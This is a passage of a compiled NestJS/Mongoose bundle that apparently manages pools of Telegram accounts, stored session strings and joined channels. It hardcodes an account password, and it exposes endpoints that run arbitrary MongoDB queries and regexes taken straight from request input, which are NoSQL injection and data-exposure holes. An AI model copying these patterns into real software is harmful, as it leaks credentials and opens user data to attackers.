], CreateActiveChannelDto.prototype, "private", void 0);


/***/ }),

/***/ "./src/components/active-channels/dto/update-active-channel.dto.ts":
/*!*************************************************************************!*\
  !*** ./src/components/active-channels/dto/update-active-channel.dto.ts ***!
  \*************************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateActiveChannelDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_active_channel_dto_1 = __webpack_require__(/*! ./create-active-channel.dto */ "./src/components/active-channels/dto/create-active-channel.dto.ts");
class UpdateActiveChannelDto extends (0, swagger_1.PartialType)(create_active_channel_dto_1.CreateActiveChannelDto) {
}
exports.UpdateActiveChannelDto = UpdateActiveChannelDto;


/***/ }),

/***/ "./src/components/active-channels/schemas/active-channel.schema.ts":
/*!*************************************************************************!*\
  !*** ./src/components/active-channels/schemas/active-channel.schema.ts ***!
  \*************************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ActiveChannelSchema = exports.ActiveChannel = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose = __importStar(__webpack_require__(/*! mongoose */ "mongoose"));
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const utils_1 = __webpack_require__(/*! ../../../utils */ "./src/utils.ts");
let ActiveChannel = class ActiveChannel {
};
exports.ActiveChannel = ActiveChannel;
__decorate([
    (0, swagger_1.ApiProperty)({ required: true }),
    (0, mongoose_1.Prop)({ required: true, unique: true }),
    __metadata("design:type", String)
], ActiveChannel.prototype, "channelId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "broadcast", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: true }),
    (0, mongoose_1.Prop)({ default: true }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "canSendMsgs", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ type: Number, default: 0 }),
    (0, mongoose_1.Prop)({ type: mongoose.Schema.Types.Number, default: 0 }),
    __metadata("design:type", Number)
], ActiveChannel.prototype, "participantsCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "restricted", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "sendMessages", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ required: true }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], ActiveChannel.prototype, "title", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ required: false, default: null }),
    (0, mongoose_1.Prop)({ required: false, default: null }),
    __metadata("design:type", String)
], ActiveChannel.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ type: Number, default: 0 }),
    (0, mongoose_1.Prop)({ type: mongoose.Schema.Types.Number, default: 0 }),
    __metadata("design:type", Number)
], ActiveChannel.prototype, "wordRestriction", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ type: Number, default: 0 }),
    (0, mongoose_1.Prop)({ type: mongoose.Schema.Types.Number, default: 0 }),
    __metadata("design:type", Number)
], ActiveChannel.prototype, "dMRestriction", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ type: [String], default: utils_1.defaultMessages }),
    (0, mongoose_1.Prop)({ type: [String], default: utils_1.defaultMessages }),
    __metadata("design:type", Array)
], ActiveChannel.prototype, "availableMsgs", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ type: [String], default: utils_1.defaultReactions }),
    (0, mongoose_1.Prop)({
        type: [String], default: utils_1.defaultReactions
    }),
    __metadata("design:type", Array)
], ActiveChannel.prototype, "reactions", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "banned", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: true }),
    (0, mongoose_1.Prop)({ default: true }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "megagroup", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "private", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "reactRestricted", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "forbidden", void 0);
exports.ActiveChannel = ActiveChannel = __decorate([
    (0, mongoose_1.Schema)({ collection: 'activeChannels', versionKey: false, autoIndex: true,
        timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        },
    })
], ActiveChannel);
exports.ActiveChannelSchema = mongoose_1.SchemaFactory.createForClass(ActiveChannel);


/***/ }),

/***/ "./src/components/archived-clients/archived-client.controller.ts":
/*!***********************************************************************!*\
  !*** ./src/components/archived-clients/archived-client.controller.ts ***!
  \***********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ArchivedClientController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const archived_client_service_1 = __webpack_require__(/*! ./archived-client.service */ "./src/components/archived-clients/archived-client.service.ts");
const create_client_dto_1 = __webpack_require__(/*! ../clients/dto/create-client.dto */ "./src/components/clients/dto/create-client.dto.ts");
const search_client_dto_1 = __webpack_require__(/*! ../clients/dto/search-client.dto */ "./src/components/clients/dto/search-client.dto.ts");
const update_client_dto_1 = __webpack_require__(/*! ../clients/dto/update-client.dto */ "./src/components/clients/dto/update-client.dto.ts");
let ArchivedClientController = class ArchivedClientController {
    constructor(archivedclientService) {
        this.archivedclientService = archivedclientService;
    }
    async create(createClientDto) {
        return this.archivedclientService.create(createClientDto);
    }
    async search(query) {
        return this.archivedclientService.search(query);
    }
    async findAll() {
        return this.archivedclientService.findAll();
    }
    async checkArchivedClients() {
        return this.archivedclientService.checkArchivedClients();
    }
    async findOne(mobile) {
        return this.archivedclientService.findOne(mobile);
    }
    async fetchOne(mobile) {
        return this.archivedclientService.fetchOne(mobile);
    }
    async update(mobile, updateClientDto) {
        return this.archivedclientService.update(mobile, updateClientDto);
    }
    async remove(mobile) {
        return this.archivedclientService.remove(mobile);
    }
    async executeQuery(query) {
        try {
            return await this.archivedclientService.executeQuery(query);
        }
        catch (error) {
            throw error;
        }
    }
};
exports.ArchivedClientController = ArchivedClientController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({ summary: 'Create user data' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_client_dto_1.CreateClientDto]),
    __metadata("design:returntype", Promise)
], ArchivedClientController.prototype, "create", null);
__decorate([
    (0, common_1.Get)('search'),
    (0, swagger_1.ApiOperation)({ summary: 'Search user data' }),
    __param(0, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [search_client_dto_1.SearchClientDto]),
    __metadata("design:returntype", Promise)
], ArchivedClientController.prototype, "search", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get all user data' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], ArchivedClientController.prototype, "findAll", null);
__decorate([
    (0, common_1.Get)('checkArchivedClients'),
    (0, swagger_1.ApiOperation)({ summary: 'Get user data by ID' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], ArchivedClientController.prototype, "checkArchivedClients", null);
__decorate([
    (0, common_1.Get)(':mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get user data by ID' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ArchivedClientController.prototype, "findOne", null);
__decorate([
    (0, common_1.Get)('fetchOne/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get user data by ID' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ArchivedClientController.prototype, "fetchOne", null);
__decorate([
    (0, common_1.Patch)(':mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update user data by ID' }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_client_dto_1.UpdateClientDto]),
    __metadata("design:returntype", Promise)
], ArchivedClientController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete user data by ID' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ArchivedClientController.prototype, "remove", null);
__decorate([
    (0, common_1.Post)('query'),
    (0, swagger_1.ApiOperation)({ summary: 'Execute a custom MongoDB query' }),
    (0, swagger_1.ApiBody)({ type: Object }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], ArchivedClientController.prototype, "executeQuery", null);
exports.ArchivedClientController = ArchivedClientController = __decorate([
    (0, swagger_1.ApiTags)('Archived Clients'),
    (0, common_1.Controller)('archived-clients'),
    __metadata("design:paramtypes", [archived_client_service_1.ArchivedClientService])
], ArchivedClientController);


/***/ }),

/***/ "./src/components/archived-clients/archived-client.module.ts":
/*!*******************************************************************!*\
  !*** ./src/components/archived-clients/archived-client.module.ts ***!
  \*******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ArchivedClientModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const client_schema_1 = __webpack_require__(/*! ../clients/schemas/client.schema */ "./src/components/clients/schemas/client.schema.ts");
const Telegram_module_1 = __webpack_require__(/*! ../Telegram/Telegram.module */ "./src/components/Telegram/Telegram.module.ts");
const archived_client_service_1 = __webpack_require__(/*! ./archived-client.service */ "./src/components/archived-clients/archived-client.service.ts");
const archived_client_controller_1 = __webpack_require__(/*! ./archived-client.controller */ "./src/components/archived-clients/archived-client.controller.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
const client_module_1 = __webpack_require__(/*! ../clients/client.module */ "./src/components/clients/client.module.ts");
let ArchivedClientModule = class ArchivedClientModule {
};
exports.ArchivedClientModule = ArchivedClientModule;
exports.ArchivedClientModule = ArchivedClientModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.initModule,
            mongoose_1.MongooseModule.forFeature([{ collection: 'ArchivedClients', name: 'ArchivedArchivedClientsModule', schema: client_schema_1.ClientSchema }]),
            (0, common_1.forwardRef)(() => Telegram_module_1.TelegramModule),
            (0, common_1.forwardRef)(() => client_module_1.ClientModule)
        ],
        controllers: [archived_client_controller_1.ArchivedClientController],
        providers: [archived_client_service_1.ArchivedClientService],
        exports: [archived_client_service_1.ArchivedClientService]
    })
], ArchivedClientModule);


/***/ }),

/***/ "./src/components/archived-clients/archived-client.service.ts":
/*!********************************************************************!*\
  !*** ./src/components/archived-clients/archived-client.service.ts ***!
  \********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ArchivedClientService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const Telegram_service_1 = __webpack_require__(/*! ../Telegram/Telegram.service */ "./src/components/Telegram/Telegram.service.ts");
const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
const client_service_1 = __webpack_require__(/*! ../clients/client.service */ "./src/components/clients/client.service.ts");
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils.ts");
let ArchivedClientService = class ArchivedClientService {
    constructor(archivedclientModel, telegramService, clientService) {
        this.archivedclientModel = archivedclientModel;
        this.telegramService = telegramService;
        this.clientService = clientService;
    }
    async create(createClientDto) {
        const createdUser = new this.archivedclientModel(createClientDto);
        return createdUser.save();
    }
    async findAll() {
        const results = await this.archivedclientModel.find().exec();
        return results;
    }
    async findOne(mobile) {
        const user = (await this.archivedclientModel.findOne({ mobile }).exec())?.toJSON();
        return user;
    }
    async fetchOne(mobile) {
        const user = (await this.archivedclientModel.findOne({ mobile }).exec())?.toJSON();
        if (user) {
            return user;
        }
        else {
            try {
                await this.telegramService.createClient(mobile, false, true);
                const newSession = await this.telegramService.createNewSession(mobile);
                await this.telegramService.deleteClient(mobile);
                return await this.create({
                    "channelLink": "default",
                    "clientId": "default",
                    "dbcoll": "default",
                    "deployKey": "default",
                    "link": "default",
                    "mainAccount": "default",
                    promoteRepl: "default",
                    "name": "default",
                    "password": "Ajtdmwajt1@",
                    "repl": "default",
                    "session": newSession,
                    "username": "default",
                    "mobile": mobile,
                    product: "default"
                });
            }
            catch (e) {
                await this.telegramService.deleteClient(mobile);
                throw new common_1.NotFoundException((0, utils_1.parseError)(e).message);
            }
        }
    }
    async update(mobile, updateClientDto) {
        delete updateClientDto["_id"];
        if (updateClientDto._doc) {
            delete updateClientDto._doc['_id'];
        }
        console.log({ ...updateClientDto });
        const updatedUser = await this.archivedclientModel.findOneAndUpdate({ mobile }, { $set: updateClientDto }, { new: true, upsert: true }).exec();
        return updatedUser;
    }
    async remove(mobile) {
        const deletedUser = await this.archivedclientModel.findOneAndDelete({ mobile }).exec();
        if (!deletedUser) {
            throw new common_1.NotFoundException(`Client with ID "${mobile}" not found`);
        }
        return deletedUser;
    }
    async search(filter) {
        console.log(filter);
        if (filter.firstName) {
            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') };
        }
        console.log(filter);
        return this.archivedclientModel.find(filter).exec();
    }
    async checkArchivedClients() {
        await this.telegramService.disconnectAll();
        await (0, Helpers_1.sleep)(2000);
        const archivedClients = await this.findAll();
        const clients = await this.clientService.findAll();
        const clientIds = clients.map(client => client.mobile);
        archivedClients.map(async (document) => {
            if (!clientIds.includes(document.mobile)) {
                try {
                    await this.telegramService.createClient(document.mobile, true, false);
                    await this.telegramService.updateUsername(document.mobile, '');
                    await this.telegramService.updateNameandBio(document.mobile, 'Deleted Account', '');
                    await this.telegramService.deleteClient(document.mobile);
                    await (0, Helpers_1.sleep)(2000);
                }
                catch (error) {
                    console.log(document.mobile, " :  false");
                    this.remove(document.mobile);
                    await this.telegramService.deleteClient(document.mobile);
                }
            }
            else {
                console.log("Number is a Active Client");
            }
        });
        return "Triggered ArchiveClients check";
    }
    async executeQuery(query) {
        try {
            if (!query) {
                throw new common_1.BadRequestException('Query is invalid.');
            }
            return await this.archivedclientModel.find(query).exec();
        }
        catch (error) {
            throw new common_1.InternalServerErrorException(error.message);
        }
    }
};
exports.ArchivedClientService = ArchivedClientService;
exports.ArchivedClientService = ArchivedClientService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('ArchivedArchivedClientsModule')),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => Telegram_service_1.TelegramService))),
    __param(2, (0, common_1.Inject)((0, common_1.forwardRef)(() => client_service_1.ClientService))),
    __metadata("design:paramtypes", [mongoose_2.Model,
        Telegram_service_1.TelegramService,
        client_service_1.ClientService])
], ArchivedClientService);


/***/ }),

/***/ "./src/components/buffer-clients/buffer-client.controller.ts":
/*!*******************************************************************!*\
  !*** ./src/components/buffer-clients/buffer-client.controller.ts ***!
  \*******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BufferClientController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const buffer_client_service_1 = __webpack_require__(/*! ./buffer-client.service */ "./src/components/buffer-clients/buffer-client.service.ts");
const create_buffer_client_dto_1 = __webpack_require__(/*! ./dto/create-buffer-client.dto */ "./src/components/buffer-clients/dto/create-buffer-client.dto.ts");
const search_buffer__client_dto_1 = __webpack_require__(/*! ./dto/search-buffer- client.dto */ "./src/components/buffer-clients/dto/search-buffer- client.dto.ts");
const update_buffer_client_dto_1 = __webpack_require__(/*! ./dto/update-buffer-client.dto */ "./src/components/buffer-clients/dto/update-buffer-client.dto.ts");
let BufferClientController = class BufferClientController {
    constructor(clientService) {
        this.clientService = clientService;
    }
    async create(createClientDto) {
        return this.clientService.create(createClientDto);
    }
    async search(query) {
        return this.clientService.search(query);
    }
    async joinChannelsforBufferClients() {
        return this.clientService.joinchannelForBufferClients();
    }
    async checkbufferClients() {
        this.clientService.checkBufferClients();
        return "initiated Checking";
    }
    async addNewUserstoBufferClients(body) {
        this.clientService.addNewUserstoBufferClients(body.badIds, body.goodIds);
        return "initiated Checking";
    }
    async findAll() {
        return this.clientService.findAll();
    }
    async setAsBufferClient(mobile) {
        return await this.clientService.setAsBufferClient(mobile);
    }
    async findOne(mobile) {
        return this.clientService.findOne(mobile);
    }
    async update(mobile, updateClientDto) {
        return this.clientService.update(mobile, updateClientDto);
    }
    async createdOrupdate(mobile, updateClientDto) {
        return this.clientService.createOrUpdate(mobile, updateClientDto);
    }
    async remove(mobile) {
        return this.clientService.remove(mobile);
    }
    async executeQuery(query) {
        try {
            return await this.clientService.executeQuery(query);
        }
        catch (error) {
            throw error;
        }
    }
};
exports.BufferClientController = BufferClientController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({ summary: 'Create user data' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_buffer_client_dto_1.CreateBufferClientDto]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "create", null);
__decorate([
    (0, common_1.Get)('search'),
    (0, swagger_1.ApiOperation)({ summary: 'Search user data' }),
    __param(0, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [search_buffer__client_dto_1.SearchBufferClientDto]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "search", null);
__decorate([
    (0, common_1.Get)('joinChannelsForBufferClients'),
    (0, swagger_1.ApiOperation)({ summary: 'Join Channels for BufferClients' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "joinChannelsforBufferClients", null);
__decorate([
    (0, common_1.Get)('checkBufferClients'),
    (0, swagger_1.ApiOperation)({ summary: 'Check Buffer Clients' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "checkbufferClients", null);
__decorate([
    (0, common_1.Post)('addNewUserstoBufferClients'),
    (0, swagger_1.ApiOperation)({ summary: 'Add New Users to Buffer Clients' }),
    (0, swagger_1.ApiBody)({ type: Object }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "addNewUserstoBufferClients", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get all user data' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "findAll", null);
__decorate([
    (0, common_1.Get)('SetAsBufferClient/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Set as Buffer Client' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'User mobile number', type: String }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "setAsBufferClient", null);
__decorate([
    (0, common_1.Get)(':mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get user data by ID' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(':mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update user data by ID' }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_buffer_client_dto_1.UpdateBufferClientDto]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "update", null);
__decorate([
    (0, common_1.Put)(':mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update user data by ID' }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_buffer_client_dto_1.UpdateBufferClientDto]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "createdOrupdate", null);
__decorate([
    (0, common_1.Delete)(':mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete user data by ID' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "remove", null);
__decorate([
    (0, common_1.Post)('query'),
    (0, swagger_1.ApiOperation)({ summary: 'Execute a custom MongoDB query' }),
    (0, swagger_1.ApiBody)({ type: Object }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "executeQuery", null);
exports.BufferClientController = BufferClientController = __decorate([
    (0, swagger_1.ApiTags)('Buffer Clients'),
    (0, common_1.Controller)('bufferclients'),
    __metadata("design:paramtypes", [buffer_client_service_1.BufferClientService])
], BufferClientController);


/***/ }),

/***/ "./src/components/buffer-clients/buffer-client.module.ts":
/*!***************************************************************!*\
  !*** ./src/components/buffer-clients/buffer-client.module.ts ***!
  \***************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BufferClientModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const buffer_client_service_1 = __webpack_require__(/*! ./buffer-client.service */ "./src/components/buffer-clients/buffer-client.service.ts");
const buffer_client_controller_1 = __webpack_require__(/*! ./buffer-client.controller */ "./src/components/buffer-clients/buffer-client.controller.ts");
const buffer_client_schema_1 = __webpack_require__(/*! ./schemas/buffer-client.schema */ "./src/components/buffer-clients/schemas/buffer-client.schema.ts");
const Telegram_module_1 = __webpack_require__(/*! ../Telegram/Telegram.module */ "./src/components/Telegram/Telegram.module.ts");
const active_channels_module_1 = __webpack_require__(/*! ../active-channels/active-channels.module */ "./src/components/active-channels/active-channels.module.ts");
const users_module_1 = __webpack_require__(/*! ../users/users.module */ "./src/components/users/users.module.ts");
const client_module_1 = __webpack_require__(/*! ../clients/client.module */ "./src/components/clients/client.module.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
const channels_module_1 = __webpack_require__(/*! ../channels/channels.module */ "./src/components/channels/channels.module.ts");
const promote_client_module_1 = __webpack_require__(/*! ../promote-clients/promote-client.module */ "./src/components/promote-clients/promote-client.module.ts");
let BufferClientModule = class BufferClientModule {
};
exports.BufferClientModule = BufferClientModule;
exports.BufferClientModule = BufferClientModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.initModule,
            mongoose_1.MongooseModule.forFeature([{ name: 'bufferClientModule', schema: buffer_client_schema_1.BufferClientSchema, collection: 'bufferClients' }]),
